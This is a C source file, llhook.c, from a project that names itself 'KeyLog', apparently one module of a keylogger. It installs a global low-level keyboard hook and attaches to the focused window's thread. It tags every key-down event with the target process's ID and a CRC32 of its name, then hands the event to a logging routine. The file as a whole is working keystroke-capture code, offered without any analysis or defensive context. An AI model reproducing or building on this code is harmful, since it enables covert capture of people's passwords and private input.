//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KeyLog project. Version 3.0
//	
// module: llhook.c
// $Revision: 58 $
// $Date: 2014-12-17 17:44:58 +0300 (Ср, 17 дек 2014) $
// description: 
//	Low-level keyboard hook

#include "..\common\main.h"
#include "..\common\common.h"
#include "..\common\guid.h"
#include "..\handle\handle.h"
#include "wnd.h"
#include "llhook.h"
#include "keylog.h"
#include "keyhook.h"

typedef struct _LLHOOK
{
	NOTIFICATION_CONSUMER;
	HHOOK hHook;
}LLHOOK,*PLLHOOK;

static LLHOOK g_LLHook = {0};

ULONG _stdcall Crc32(char* pMem, unsigned long uLen);

// low-level keyboard hook function
static LRESULT CALLBACK 
	LLKeyboardProc(
		int nCode, 
		WPARAM wParam, 
		LPARAM lParam
		) 
{
	PKBDLLHOOKSTRUCT HookStruct = (PKBDLLHOOKSTRUCT)lParam;

	DWORD CurrentThread;
	HWND  hForeground,hFocus = NULL;

	DWORD ProcessID = 0;
	DWORD ThreadID  = 0;
	DWORD HostProcess = 0;
	HANDLE hProcess;
	BOOL bAttached = FALSE;
	CHAR  ProcessName[MAX_PATH];
	
#ifdef _DEBUG
	lstrcpy(ProcessName, szUnknown);
#endif

	do {
		if ( !g_bLoggerEnabled || ( nCode != HC_ACTION ) || !HookStruct ){
			break;
		}

		if ( (UINT)wParam != WM_KEYDOWN ){ //message 
			break;
		}

		CurrentThread = GetCurrentThreadId();
		hForeground = GetForegroundWindow();

#ifndef _DEBUG
		ProcessName[0] = 0;
#endif
		if ( hForeground == NULL ){
			DbgPrint("GetForegroundWindow is NULL\n");
			break;
		}

		// get thread and process for foreground window
		if ( ThreadID = GetWindowThreadProcessId(hForeground,&ProcessID) )
		{
			if ( CurrentThread != ThreadID ){
				bAttached =
					AttachThreadInput(
						CurrentThread,
						ThreadID,
						TRUE
						);
			}
		}else{
			DbgPrint("GetWindowThreadProcessId failed, err=%lu\n",GetLastError());
		}

		// wnd that owns focus can be handled by different thread
		hFocus = GetFocus();
		if ( hFocus != hForeground )
		{
			// detach input
			if ( bAttached ){
				AttachThreadInput(
					CurrentThread,
					ThreadID,
					FALSE
					);
				bAttached = FALSE;
			}
			if ( ThreadID = GetWindowThreadProcessId(hFocus,&ProcessID) )
			{
				if ( CurrentThread != ThreadID ){
					bAttached =
						AttachThreadInput(
							CurrentThread,
							ThreadID,
							TRUE
							);
				}
			}else{
				DbgPrint("GetWindowThreadProcessId failed, err=%lu\n",GetLastError());
			}
		}

		if ( ProcessID ){
			hProcess = 
				OpenProcess(
					PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
					FALSE,
					ProcessID
					);
			if ( hProcess )
			{
				if ( GetModuleBaseNameA(hProcess,NULL,ProcessName,MAX_PATH) ){
					strupr(ProcessName);
					HostProcess = Crc32(ProcessName, lstrlenA(ProcessName));
				}else{
					DbgPrint("GetModuleBaseName failed, err=%lu\n",GetLastError());
				}
				CloseHandle(hProcess);
			}else{
				DbgPrint("OpenProcess failed, err=%lu\n",GetLastError());
			}
		}

		// log kbd event
		KeyProcessMessage( 
			hFocus, 
			(UINT)wParam, //message 
			(UINT)HookStruct->vkCode, 
			(UINT)HookStruct->scanCode, 
			ProcessID,
			ThreadID,
			HostProcess
#ifdef _DEBUG
			,ProcessName
#endif
			);

		if ( bAttached ){
			AttachThreadInput(
				CurrentThread,
				ThreadID,
				FALSE
				);
		}
	} while ( FALSE );

	return CallNextHookEx(0, nCode, wParam, lParam);
}

WINERROR LLHookRegister0(IN PLLHOOK pHook)
{
	WINERROR Status = NO_ERROR;
	// Add the window to the clipboard viewer chain. 
	ASSERT(pHook->hHook==NULL);
	pHook->hHook = 
		SetWindowsHookEx(
			WH_KEYBOARD_LL, 
			(HOOKPROC)LLKeyboardProc, 
			g_CurrentProcessModule, 0
			);
	if ( pHook->hHook == NULL ){
		Status = GetLastError();
		DbgPrint("SetWindowsHookEx failed, err=%lu\n",Status);
	}
	return Status;
}

VOID LLHookUnregister0(IN PLLHOOK pHook)
{
	if ( pHook->hHook )
	{
		DbgPrint("[LLHookUnregister0] keyboard hook\n");
		UnhookWindowsHookEx(pHook->hHook);
		pHook->hHook = NULL;
	}
}


//
// initializes low-level keyboard hook
//
VOID LLHookInitialize(VOID)
{
	g_LLHook.Register0   = (PNWND_REGISTER0)LLHookRegister0;
	g_LLHook.Unregister0 = (PNWND_UNREGISTER0)LLHookUnregister0;

	NWindowRegister((PNOTIFICATION_CONSUMER)&g_LLHook);
}


//
// stops and releases low-level keyboard hook
//
VOID LLHookRelease(VOID)
{
	NWindowUnregister((PNOTIFICATION_CONSUMER)&g_LLHook);
	memset(&g_LLHook, 0, sizeof(LLHOOK));
}


//
//	Enables/disables low-level keyboard hook notification consumer
//
VOID LLHookEnable(BOOL bEnable)
{
	g_LLHook.bActive = bEnable;
}
